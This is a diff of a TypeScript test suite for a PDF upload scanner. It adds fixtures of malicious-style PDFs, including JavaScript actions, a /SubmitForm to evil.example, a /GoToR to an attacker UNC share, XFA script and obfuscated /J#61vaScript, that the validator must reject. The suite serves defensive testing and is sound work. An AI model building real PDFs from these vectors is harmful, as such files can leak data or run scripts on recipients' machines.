@@ -361,20 +361,42 @@ async function main() {
     'Botón /Widget /FT /Btn con acción /A de JavaScript es RECHAZADO'
   );
 
-  // 2.14 Capacidades peligrosas siempre bloqueadas: /Names /JavaScript, /SubmitForm, /ImportData, /GoToR, /GoToE, /EmbeddedFile
+  // 2.14 Capacidades peligrosas siempre bloqueadas: /Names /JavaScript, /SubmitForm, /ImportData, /GoToR, /GoToE, /XFA, /RichMedia
   const dangerousVectors: Array<[string, string]> = [
     ['/Names /JavaScript', '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Names << /JavaScript 2 0 R >> >>\nendobj\n%%EOF'],
     ['/SubmitForm', '%PDF-1.4\n1 0 obj\n<< /Type /Action /S /SubmitForm /F (https://evil.example) >>\nendobj\n%%EOF'],
     ['/ImportData', '%PDF-1.4\n1 0 obj\n<< /Type /Action /S /ImportData /F (data.fdf) >>\nendobj\n%%EOF'],
     ['/GoToR', '%PDF-1.4\n1 0 obj\n<< /Type /Action /S /GoToR /F (\\\\\\\\attacker\\\\share\\\\x.pdf) >>\nendobj\n%%EOF'],
     ['/GoToE', '%PDF-1.4\n1 0 obj\n<< /Type /Action /S /GoToE /T << /R /C /N (payload) >> >>\nendobj\n%%EOF'],
-    ['/EmbeddedFile', '%PDF-1.4\n1 0 obj\n<< /Type /Filespec /F (evil.exe) /EF << /F 2 0 R >> >>\nendobj\n%%EOF'],
+    [
+      '/XFA',
+      '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /AcroForm << /XFA 2 0 R >> >>\nendobj\n2 0 obj\n<< /Length 42 >>\nstream\n<xdp><script>app.alert(1)</script></xdp>\nendstream\nendobj\n%%EOF',
+    ],
+    ['/RichMedia', '%PDF-1.4\n1 0 obj\n<< /Type /Annot /Subtype /RichMedia >>\nendobj\n%%EOF'],
   ];
   for (const [label, raw] of dangerousVectors) {
     const buf = Buffer.from(raw);
     const res = await validateFileStream(Readable.from(buf), 'application/pdf', buf.length);
     assert(res.isValid === false && res.hasDangerousPdfMarks === true, `Vector peligroso ${label} es RECHAZADO`);
   }
+
+  // Fixture histórico de 2.14 (/Filespec con /EF << /F 2 0 R >> donde 2 0 R no existe en el PDF):
+  // Con la política E3 + fail-closed, se rechaza determinísticamente por referencia sin resolver
+  // (UNRESOLVED_EMBEDDED_FILE, hasDangerousPdfMarks = false), nunca por coincidencia de nombre.
+  const unresolvedFilespecPdf = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Filespec /F (evil.exe) /EF << /F 2 0 R >> >>\nendobj\n%%EOF'
+  );
+  const unresolvedFilespecRes = await validateFileStream(
+    Readable.from(unresolvedFilespecPdf),
+    'application/pdf',
+    unresolvedFilespecPdf.length
+  );
+  assert(
+    unresolvedFilespecRes.isValid === false &&
+      unresolvedFilespecRes.hasDangerousPdfMarks === false &&
+      /UNRESOLVED_EMBEDDED_FILE/.test(unresolvedFilespecRes.technicalReason || ''),
+    '2.14 histórico: /Filespec con /EF apuntando a objeto inexistente (2 0 R) falla cerrado (UNRESOLVED_EMBEDDED_FILE)'
+  );
 
   // 2.15 /ObjStm comprimido con zlib: válido permitido, malicioso rechazado, /Encrypt + /ObjStm rechazado como protegido
   const safeObjStmHdr = '1 0 ';
@@ -563,6 +585,369 @@ async function main() {
     !threwOutside && noThrowScanResult?.isSafe === false,
     'Adverso: PdfSecurityScanner nunca lanza excepciones hacia afuera y falla cerrado'
   );
+
+  // 2.17 Política E3 para /EmbeddedFile pasivo (estilo Tanenbaum + vectores de abuso)
+  const jobOptionsPayload = zlib.deflateSync(
+    Buffer.from('<< /ASCII85EncodePages false /CalRGBProfile (sRGB IEC61966-2.1) >>')
+  );
+  const buildTanenbaumLikePdf = (extraObj = '', catalogExtra = '') =>
+    Buffer.concat([
+      Buffer.from(
+        `%PDF-1.5\n` +
+          `1 0 obj\n<< /Type /Catalog /Pages 2 0 R /Names 5 0 R ${catalogExtra}>>\nendobj\n` +
+          `2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n` +
+          `3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [4 0 R] >>\nendobj\n` +
+          `4 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /GoTo /D [3 0 R /Fit] >> >>\nendobj\n` +
+          `5 0 obj\n<< /EmbeddedFiles 6 0 R >>\nendobj\n` +
+          `6 0 obj\n<< /Names [(Luxel.joboptions) 7 0 R] >>\nendobj\n` +
+          `7 0 obj\n<< /Type /Filespec /F (Luxel.joboptions) /EF << /F 8 0 R >> >>\nendobj\n` +
+          `8 0 obj\n<< /Type /EmbeddedFile /Filter /FlateDecode /Length ${jobOptionsPayload.length} >>\nstream\n`
+      ),
+      jobOptionsPayload,
+      Buffer.from(`\nendstream\nendobj\n${extraObj}%%EOF`),
+    ]);
+
+  const tanenbaumOkPdf = buildTanenbaumLikePdf();
+  const tanenbaumOkRes = await validateFileStream(
+    Readable.from(tanenbaumOkPdf),
+    'application/pdf',
+    tanenbaumOkPdf.length
+  );
+  assert(
+    tanenbaumOkRes.isValid === true,
+    'E3: Estructura Tanenbaum (/Names /EmbeddedFiles + /Filespec /EF + stream comprimido + links /GoTo) es PERMITIDA'
+  );
+
+  const tanenbaumOpenActionFilespec = buildTanenbaumLikePdf('', '/OpenAction 7 0 R ');
+  const tanenbaumOaRes = await validateFileStream(
+    Readable.from(tanenbaumOpenActionFilespec),
+    'application/pdf',
+    tanenbaumOpenActionFilespec.length
+  );
+  assert(
+    tanenbaumOaRes.isValid === false && tanenbaumOaRes.hasDangerousPdfMarks === true,
+    'E3: Mismo PDF con /OpenAction apuntando al /Filespec es RECHAZADO'
+  );
+
+  const tanenbaumActionAFilespec = buildTanenbaumLikePdf(
+    '9 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /GoTo /F 7 0 R >> >>\nendobj\n'
+  );
+  const tanenbaumARes = await validateFileStream(
+    Readable.from(tanenbaumActionAFilespec),
+    'application/pdf',
+    tanenbaumActionAFilespec.length
+  );
+  assert(
+    tanenbaumARes.isValid === false && tanenbaumARes.hasDangerousPdfMarks === true,
+    'E3: Mismo PDF con /A apuntando al /Filespec es RECHAZADO'
+  );
+
+  const tanenbaumGoToE = buildTanenbaumLikePdf(
+    '9 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /GoToE /T << /R /C /N (Luxel.joboptions) >> >> >>\nendobj\n'
+  );
+  const tanenbaumGoToERes = await validateFileStream(
+    Readable.from(tanenbaumGoToE),
+    'application/pdf',
+    tanenbaumGoToE.length
+  );
+  assert(
+    tanenbaumGoToERes.isValid === false && tanenbaumGoToERes.hasDangerousPdfMarks === true,
+    'E3: Mismo PDF con acción /GoToE hacia el adjunto es RECHAZADO'
+  );
+
+  const tanenbaumPlusBadAa = buildTanenbaumLikePdf(
+    '9 0 obj\n<< /Type /Page /AA << /O << /S /JavaScript /JS (app.alert(1)) >> >> >>\nendobj\n'
+  );
+  const tanenbaumBadAaRes = await validateFileStream(
+    Readable.from(tanenbaumPlusBadAa),
+    'application/pdf',
+    tanenbaumPlusBadAa.length
+  );
+  assert(
+    tanenbaumBadAaRes.isValid === false && tanenbaumBadAaRes.hasDangerousPdfMarks === true,
+    'E3: Adjunto pasivo resuelto + /AA con JS fuera de campo de formulario válido sigue RECHAZADO'
+  );
+
+  const overCapCount = PDF_SCANNER_LIMITS.MAX_EMBEDDED_FILES + 1;
+  const manyAttachmentsChunks: Buffer[] = [Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n')];
+  for (let i = 0; i < overCapCount; i++) {
+    const fsId = 10 + i * 2;
+    const stmId = fsId + 1;
+    manyAttachmentsChunks.push(
+      Buffer.from(
+        `${fsId} 0 obj\n<< /Type /Filespec /F (doc${i}.txt) /EF << /F ${stmId} 0 R >> >>\nendobj\n` +
+          `${stmId} 0 obj\n<< /Type /EmbeddedFile /Length 4 >>\nstream\ntest\nendstream\nendobj\n`
+      )
+    );
+  }
+  manyAttachmentsChunks.push(Buffer.from('%%EOF'));
+  const manyAttachmentsPdf = Buffer.concat(manyAttachmentsChunks);
+  const manyAttachmentsRes = await validateFileStream(
+    Readable.from(manyAttachmentsPdf),
+    'application/pdf',
+    manyAttachmentsPdf.length
+  );
+  assert(
+    manyAttachmentsRes.isValid === false &&
+      manyAttachmentsRes.hasDangerousPdfMarks === true &&
+      /MAX_EMBEDDED_FILES/.test(manyAttachmentsRes.technicalReason || ''),
+    `E3: PDF con ${overCapCount} adjuntos (> MAX_EMBEDDED_FILES=${PDF_SCANNER_LIMITS.MAX_EMBEDDED_FILES}) es RECHAZADO`
+  );
+  assertUserMsgIsCleanAndHelpful(manyAttachmentsRes, 'E3 cap de adjuntos');
+
+  // 2.18 Hardening: actualizaciones incrementales, lista blanca /S, formularios anidados, /NeedAppearances, >256 /ObjStm y chunking 1B vs 1MB
+  const incrementalCases: Array<[string, string]> = [
+    [
+      '1a (inocente -> malicioso directo)',
+      '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction [3 0 R /Fit] >>\nendobj\n%%EOF\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /JavaScript /JS (1) >> >>\nendobj\n%%EOF',
+    ],
+    [
+      '1b (malicioso -> inocente directo)',
+      '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /JavaScript /JS (1) >> >>\nendobj\n%%EOF\n1 0 obj\n<< /Type /Catalog /OpenAction [3 0 R /Fit] >>\nendobj\n%%EOF',
+    ],
+    [
+      '1c1 (inocente -> malicioso ref 7 0 R)',
+      '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction 7 0 R >>\nendobj\n7 0 obj\n<< /S /GoTo /D [3 0 R /Fit] >>\nendobj\n%%EOF\n7 0 obj\n<< /S /JavaScript /JS (1) >>\nendobj\n%%EOF',
+    ],
+    [
+      '1c2 (malicioso -> inocente ref 7 0 R)',
+      '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction 7 0 R >>\nendobj\n7 0 obj\n<< /S /JavaScript /JS (1) >>\nendobj\n%%EOF\n7 0 obj\n<< /S /GoTo /D [3 0 R /Fit] >>\nendobj\n%%EOF',
+    ],
+    [
+      '1d (/Parent con 2 versiones donde 1 es /Page)',
+      '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /AcroForm << /Fields [5 0 R] >> >>\nendobj\n2 0 obj\n<< /Type /Page >>\nendobj\n2 0 obj\n<< /FT /Tx >>\nendobj\n5 0 obj\n<< /Subtype /Widget /Parent 2 0 R /AA << /C << /S /JavaScript /JS (1) >> >> >>\nendobj\n%%EOF',
+    ],
+  ];
+  for (const [label, raw] of incrementalCases) {
+    const buf = Buffer.from(raw);
+    const res = await validateFileStream(Readable.from(buf), 'application/pdf', buf.length);
+    assert(
+      res.isValid === false && res.hasDangerousPdfMarks === true,
+      `Hardening incremental ${label} es RECHAZADO`
+    );
+  }
+
+  const conflictingObjStmLenComp = zlib.deflateSync(Buffer.from('1 0 << /Type /Catalog >>'));
+  const conflictingObjStmLenPdf = Buffer.concat([
+    Buffer.from(
+      `%PDF-1.5\n11 0 obj\n${conflictingObjStmLenComp.length}\nendobj\n11 0 obj\n${conflictingObjStmLenComp.length + 1}\nendobj\n` +
+        `10 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /Length 11 0 R >>\nstream\n`
+    ),
+    conflictingObjStmLenComp,
+    Buffer.from('\nendstream\nendobj\n%%EOF'),
+  ]);
+  const conflictingObjStmLenRes = await validateFileStream(
+    Readable.from(conflictingObjStmLenPdf),
+    'application/pdf',
+    conflictingObjStmLenPdf.length
+  );
+  assert(
+    conflictingObjStmLenRes.isValid === false &&
+      /CONFLICTING_OBJSTM_LENGTH/.test(conflictingObjStmLenRes.technicalReason || ''),
+    'Hardening: /ObjStm con /Length en 2 versiones incrementales conflictivas falla cerrado'
+  );
+
+  // Lista blanca fail-closed de /S en /A, /AA y /Type /Action sueltos
+  const disallowedSVectors: Array<[string, string]> = [
+    ['/Rendition en /A', '%PDF-1.4\n1 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /Rendition /OP 0 >> >>\nendobj\n%%EOF'],
+    ['/Movie en /A', '%PDF-1.4\n1 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /Movie >> >>\nendobj\n%%EOF'],
+    ['/Sound en /Type /Action', '%PDF-1.4\n1 0 obj\n<< /Type /Action /S /Sound >>\nendobj\n%%EOF'],
+    ['/GoToDp en /AA', '%PDF-1.4\n1 0 obj\n<< /Type /Page /AA << /O << /S /GoToDp >> >> >>\nendobj\n%%EOF'],
+    ['/Hide en /AA', '%PDF-1.4\n1 0 obj\n<< /Type /Page /AA << /O << /S /Hide /H true >> >> >>\nendobj\n%%EOF'],
+    ['/SetOCGState en /A', '%PDF-1.4\n1 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /SetOCGState /State [/OFF] >> >>\nendobj\n%%EOF'],
+    ['/Named /Quit en /A', '%PDF-1.4\n1 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /Named /N /Quit >> >>\nendobj\n%%EOF'],
+    ['/Named /Quit en /AA', '%PDF-1.4\n1 0 obj\n<< /Type /Page /AA << /O << /S /Named /N /Quit >> >> >>\nendobj\n%%EOF'],
+    ['Desconocida en /A', '%PDF-1.4\n1 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /UnknownFutureAction >> >>\nendobj\n%%EOF'],
+    ['Desconocida en /AA', '%PDF-1.4\n1 0 obj\n<< /Type /Page /AA << /O << /S /UnknownFutureAction >> >> >>\nendobj\n%%EOF'],
+    ['Desconocida en /Type /Action', '%PDF-1.4\n1 0 obj\n<< /Type /Action /S /UnknownFutureAction >>\nendobj\n%%EOF'],
+  ];
+  for (const [label, raw] of disallowedSVectors) {
+    const buf = Buffer.from(raw);
+    const res = await validateFileStream(Readable.from(buf), 'application/pdf', buf.length);
+    assert(
+      res.isValid === false && res.hasDangerousPdfMarks === true,
+      `Hardening lista blanca /S: ${label} es RECHAZADO`
+    );
+  }
+
+  // /Named /NextPage permitido en /A y en /AA, y /StructElem con /A de layout permitido
+  const safeNamedAndStructElemPdf = Buffer.from(
+    '%PDF-1.4\n' +
+      '1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n' +
+      '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n' +
+      '3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [4 0 R] /AA << /O << /S /Named /N /FirstPage >> >> >>\nendobj\n' +
+      '4 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /Named /N /NextPage >> >>\nendobj\n' +
+      '5 0 obj\n<< /Type /StructElem /S /P /A << /O /Layout /TextAlign /Justify >> >>\nendobj\n%%EOF'
+  );
+  const safeNamedStructRes = await validateFileStream(
+    Readable.from(safeNamedAndStructElemPdf),
+    'application/pdf',
+    safeNamedAndStructElemPdf.length
+  );
+  assert(
+    safeNamedStructRes.isValid === true,
+    'Hardening: /Named /NextPage (/FirstPage) y /Type /StructElem con /A de layout son PERMITIDOS'
+  );
+
+  // 3a: Widget legítimo en /Page /Annots con /P 3 0 R y /AcroForm -> PERMITIDO
+  const legitWidget3aPdf = Buffer.from(
+    '%PDF-1.4\n' +
+      '1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [4 0 R] >> >>\nendobj\n' +
+      '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n' +
+      '3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [4 0 R] >>\nendobj\n' +
+      '4 0 obj\n<< /Type /Annot /Subtype /Widget /FT /Tx /T (Suma) /P 3 0 R /AA << /C << /S /JavaScript /JS (AFSimple_Calculate("SUM",["a"])) >> >> >>\nendobj\n%%EOF'
+  );
+  const legitWidget3aRes = await validateFileStream(
+    Readable.from(legitWidget3aPdf),
+    'application/pdf',
+    legitWidget3aPdf.length
+  );
+  assert(
+    legitWidget3aRes.isValid === true,
+    'Hardening 3a: /Widget legítimo en /Page /Annots con /P y /AcroForm /Fields es PERMITIDO'
+  );
+
+  // Formulario con /Kids anidados (2 niveles) y /FT heredado del padre -> PERMITIDO
+  const nestedKidsFormPdf = Buffer.from(
+    '%PDF-1.4\n' +
+      '1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [4 0 R] >> >>\nendobj\n' +
+      '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n' +
+      '3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [6 0 R] >>\nendobj\n' +
+      '4 0 obj\n<< /FT /Tx /T (Grupo) /Kids [5 0 R] >>\nendobj\n' +
+      '5 0 obj\n<< /T (Subgrupo) /Parent 4 0 R /Kids [6 0 R] >>\nendobj\n' +
+      '6 0 obj\n<< /Type /Annot /Subtype /Widget /Parent 5 0 R /P 3 0 R /AA << /C << /S /JavaScript /JS (event.value=1) >> >> >>\nendobj\n%%EOF'
+  );
+  const nestedKidsRes = await validateFileStream(
+    Readable.from(nestedKidsFormPdf),
+    'application/pdf',
+    nestedKidsFormPdf.length
+  );
+  assert(
+    nestedKidsRes.isValid === true,
+    'Hardening: formulario legítimo con /Kids anidados y /FT heredado del padre es PERMITIDO'
+  );
+
+  // 3b: Widget huérfano (sin /AcroForm o sin /FT) -> RECHAZADO
+  const orphanWidgetNoAcroForm = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n9 0 obj\n<< /Subtype /Widget /FT /Tx /AA << /C << /S /JavaScript /JS (app.alert(1)) >> >> >>\nendobj\n%%EOF'
+  );
+  const orphanWidgetNoAcroRes = await validateFileStream(
+    Readable.from(orphanWidgetNoAcroForm),
+    'application/pdf',
+    orphanWidgetNoAcroForm.length
+  );
+  assert(
+    orphanWidgetNoAcroRes.isValid === false && orphanWidgetNoAcroRes.hasDangerousPdfMarks === true,
+    'Hardening 3b: /Widget huérfano fuera de /Catalog -> /AcroForm -> /Fields es RECHAZADO'
+  );
+
+  const widgetNoFtInAcroForm = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /AcroForm << /Fields [9 0 R] >> >>\nendobj\n9 0 obj\n<< /Subtype /Widget /AA << /C << /S /JavaScript /JS (app.alert(1)) >> >> >>\nendobj\n%%EOF'
+  );
+  const widgetNoFtRes = await validateFileStream(
+    Readable.from(widgetNoFtInAcroForm),
+    'application/pdf',
+    widgetNoFtInAcroForm.length
+  );
+  assert(
+    widgetNoFtRes.isValid === false && widgetNoFtRes.hasDangerousPdfMarks === true,
+    'Hardening 3b: /Widget dentro de /Fields pero sin /FT propio ni heredado es RECHAZADO'
+  );
+
+  // 3c: /NeedAppearances true en /AcroForm junto con /AA JS -> RECHAZADO
+  const needAppearancesPdf = Buffer.from(
+    '%PDF-1.4\n' +
+      '1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [4 0 R] /NeedAppearances true >> >>\nendobj\n' +
+      '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n' +
+      '3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [4 0 R] >>\nendobj\n' +
+      '4 0 obj\n<< /Type /Annot /Subtype /Widget /FT /Tx /Rect [0 0 0 0] /V (1) /AA << /F << /S /JavaScript /JS (app.alert(1)) >> >> >>\nendobj\n%%EOF'
+  );
+  const needAppearancesRes = await validateFileStream(
+    Readable.from(needAppearancesPdf),
+    'application/pdf',
+    needAppearancesPdf.length
+  );
+  assert(
+    needAppearancesRes.isValid === false &&
+      needAppearancesRes.hasDangerousPdfMarks === true &&
+      /AA_JS_NEED_APPEARANCES/.test(needAppearancesRes.technicalReason || ''),
+    'Hardening 3c: /AcroForm con /NeedAppearances true y /AA con JS es RECHAZADO'
+  );
+
+  // Más de 256 /ObjStm legítimos pequeños (300) -> PERMITIDO (sin MAX_OBJSTM_COUNT)
+  const manyObjStmParts: Buffer[] = [Buffer.from('%PDF-1.5\n1 0 obj\n<< /Type /Catalog >>\nendobj\n')];
+  for (let i = 0; i < 300; i++) {
+    const oid = 100 + i;
+    const hdr = `${oid} 0 `;
+    const inner = Buffer.from(`${hdr}<< /Type /ExtGState /CA 1 >>`);
+    const comp = zlib.deflateSync(inner);
+    manyObjStmParts.push(
+      Buffer.from(
+        `${500 + i} 0 obj\n<< /Type /ObjStm /N 1 /First ${hdr.length} /Filter /FlateDecode /Length ${comp.length} >>\nstream\n`
+      ),
+      comp,
+      Buffer.from('\nendstream\nendobj\n')
+    );
+  }
+  manyObjStmParts.push(Buffer.from('%%EOF'));
+  const manyObjStmPdf = Buffer.concat(manyObjStmParts);
+  const manyObjStmRes = await validateFileStream(
+    Readable.from(manyObjStmPdf),
+    'application/pdf',
+    manyObjStmPdf.length
+  );
+  assert(
+    manyObjStmRes.isValid === true,
+    'Hardening: PDF con 300 /ObjStm legítimos pequeños (> 256) es PERMITIDO'
+  );
+
+  // Chunking extremo: 1 byte vs 1 MB sobre permitido, rechazado y truncado
+  const chunkObjStmHdr = '1 0 ';
+  const chunkObjStmComp = zlib.deflateSync(
+    Buffer.from(`${chunkObjStmHdr}<< /Type /Catalog /OpenAction [3 0 R /Fit] >>`)
+  );
+  const chunkFixtureAllowed = Buffer.concat([
+    Buffer.from('%PDF-1.5\n2 0 obj\n<< /Length 29 >>\nstream\nBT (/JavaScript /JS) Tj ET\nendstream\nendobj\n'),
+    Buffer.from(
+      `10 0 obj\n<< /Type /ObjStm /N 1 /First ${chunkObjStmHdr.length} /Filter /FlateDecode /Length ${chunkObjStmComp.length} >>\nstream\n`
+    ),
+    chunkObjStmComp,
+    Buffer.from('\nendstream\nendobj\n%%EOF'),
+  ]);
+  const chunkFixtureRejected = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Length 12 >>\nstream\nhello world!\nendstream\nendobj\n' +
+      '2 0 obj\n<< /Type /Catalog /OpenAction 7 0 R >>\nendobj\n' +
+      '7 0 obj\n<< /S /J#61vaScript /JS (app.alert(1)) >>\nendobj\n%%EOF'
+  );
+  const chunkFixtureTruncated = Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction << /S /GoTo /D [3 0 R'
+  );
+  async function runWithChunkSize(buf: Buffer, chunkSize: number) {
+    async function* genChunks() {
+      for (let off = 0; off < buf.length; off += chunkSize) {
+        yield buf.subarray(off, Math.min(off + chunkSize, buf.length));
+      }
+    }
+    return await validateFileStream(Readable.from(genChunks()), 'application/pdf', buf.length);
+  }
+  const origWarnForChunkTest = console.warn;
+  console.warn = () => {};
+  try {
+    for (const [label, buf, expectedValid] of [
+      ['permitido', chunkFixtureAllowed, true],
+      ['rechazado', chunkFixtureRejected, false],
+      ['truncado', chunkFixtureTruncated, false],
+    ] as const) {
+      const r1B = await runWithChunkSize(buf, 1);
+      const r1MB = await runWithChunkSize(buf, 1024 * 1024);
+      assert(
+        JSON.stringify(r1B) === JSON.stringify(r1MB) && r1B.isValid === expectedValid,
+        `Chunking 1B vs 1MB idéntico para fixture ${label}`
+      );
+    }
+  } finally {
+    console.warn = origWarnForChunkTest;
+  }
 
   // ---------------------------------------------------------------------------
   // 3. ENTORNO HTTP Y CONFIGURACIÓN EN MEMORIA
